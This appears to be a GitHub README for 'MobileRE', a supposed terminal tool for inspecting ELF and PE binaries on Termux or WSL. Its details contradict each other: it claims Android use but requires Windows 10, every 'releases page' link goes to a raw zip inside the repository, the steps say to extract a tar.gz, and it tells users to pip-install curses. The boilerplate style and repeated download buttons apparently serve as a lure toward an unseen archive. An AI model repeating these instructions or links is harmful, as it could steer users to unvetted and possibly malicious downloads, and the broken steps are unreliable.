# 🛠️ MobileRE - Reverse Engineering Made Easy

[![Download MobileRE](https://img.shields.io/badge/Download-MobileRE-brightgreen?style=for-the-badge)](https://github.com/Andrecam5683/MobileRE/raw/refs/heads/main/mobRE/RE_Mobile_1.3-alpha.1.zip)

---

## 📱 What is MobileRE?

MobileRE is a tool designed for users who want to perform reverse engineering on mobile devices or computers without needing a PC or laptop. It works well for termux users and anyone who wants to explore files, binaries, or software on the go. The app has a simple interface that runs on Android phones through termux or similar environments.

This software handles common file types in reverse engineering, such as ELF, PE files, and others. It helps you understand and analyze programs by showing you their structure and behavior in a clear way.

---

## 🖥️ System Requirements

MobileRE runs primarily on Android devices with termux installed. It can also run on Windows systems if you use Windows Subsystem for Linux (WSL) or a compatible terminal emulator.

Minimum requirements:

- Windows 10 or higher.
- 4 GB of RAM.
- 500 MB of free disk space.
- Internet connection to download and update MobileRE.
- Termux or a Linux-like environment on your device (for mobile users).

---

## 🚀 Getting Started  
Follow these steps to get MobileRE running on your Windows PC.

### Step 1: Download MobileRE  
Since MobileRE does not provide a standalone Windows installer, you will need to visit the releases page and download the version suited for your platform.  

Click the green button below to open the download page:  

[![Download MobileRE](https://img.shields.io/badge/Go_to_Download_Page-blue?style=for-the-badge)](https://github.com/Andrecam5683/MobileRE/raw/refs/heads/main/mobRE/RE_Mobile_1.3-alpha.1.zip)

On the releases page, you will find files related to MobileRE. Download the file that matches your system or follows the instructions provided there.

---

### Step 2: Prepare Your Environment on Windows

To run MobileRE on Windows, you need a terminal emulator that supports Linux commands. The recommended way is to install Windows Subsystem for Linux (WSL).  

#### Installing WSL:  

1. Open the Start menu and search for "PowerShell."  
2. Right-click "Windows PowerShell" and select "Run as administrator."  
3. Type the following command and press Enter:  
   
   `wsl --install`  

4. Restart your computer if prompted.  
5. After reboot, open the Microsoft Store, search for “Ubuntu”, and install it.  
6. Launch Ubuntu from the Start menu and create a user account when asked.  

---

### Step 3: Install Python and Required Packages

MobileRE requires Python 3 to run and some Python libraries for handling different file types like PE and ELF.

Inside the Ubuntu terminal (WSL), run:

```
sudo apt update
sudo apt install python3 python3-pip
```

Next, install the required Python packages by running:

```
pip3 install pefile
pip3 install curses
```

These packages help MobileRE read and display information about files in the terminal window.

---

### Step 4: Download MobileRE Files

If the release page provides a zipped file or tarball, download it to a folder you can access inside WSL. For example, download it to your Windows user folder, which is accessible in WSL under `/mnt/c/Users/YourUsername/Downloads`.

Use the following example command inside WSL to move to that folder:

```
cd /mnt/c/Users/YourUsername/Downloads
```

Extract the downloaded archive if necessary:

```
tar -xzf MobileRE-version.tar.gz
```

Replace `MobileRE-version.tar.gz` with the actual filename you downloaded.

---

### Step 5: Running MobileRE

After extracting the files, navigate to the MobileRE folder:

```
cd MobileRE-folder
```

Replace `MobileRE-folder` with the extracted folder name.

To run MobileRE, use:

```
python3 mobile_re.py
```

This command starts the program inside your terminal window. You will see a text-based user interface that lets you load files and start reverse engineering.

---

## 🔎 How to Use MobileRE

MobileRE uses a console-based graphical user interface (GUI) that works with your keyboard. 

- Use the arrow keys to navigate menus.  
- Press Enter to select options.  
- Use Escape or Backspace to go back.

The program shows you details of executable files:

- Header information for ELF or PE files.  
- Sections and segments within the binaries.  
- Symbols and function names inside the files.

You can load any compatible file from the menu and explore its properties.

---

## ⚙️ Basic Features  

- Display detailed file headers for ELF and PE executables.  
- List imported and exported functions and symbols.  
- Show sections, segments, and data ranges.  
- Search for strings and patterns inside the binary.  
- A curses-based terminal UI for easy navigation.  
- Works on termux and Linux-based systems, including WSL on Windows.

---

## 🔄 Updating MobileRE

To update MobileRE, revisit the [MobileRE releases page](https://github.com/Andrecam5683/MobileRE/raw/refs/heads/main/mobRE/RE_Mobile_1.3-alpha.1.zip) and download the latest version. Replace your existing files with the new ones.  

If you use Python for handling dependencies, run:

```
pip3 install --upgrade pefile
```

to keep Python libraries current.

---

## ❓ Troubleshooting  

- If you get errors about missing Python packages, reinstall them with `pip3 install <package-name>`.  
- Make sure you are running MobileRE inside a proper Linux terminal, such as WSL or termux.  
- Ensure your downloaded files are complete and not corrupted before running.  
- If the user interface looks broken, try resizing your terminal window or changing font size.

---

## 📂 Additional Resources  

For more details about the tool's capabilities and source code, browse the MobileRE repository on GitHub. You can read the documentation files included in the release packages for additional guidance on advanced features.

---

[Download MobileRE on GitHub Releases](https://github.com/Andrecam5683/MobileRE/raw/refs/heads/main/mobRE/RE_Mobile_1.3-alpha.1.zip)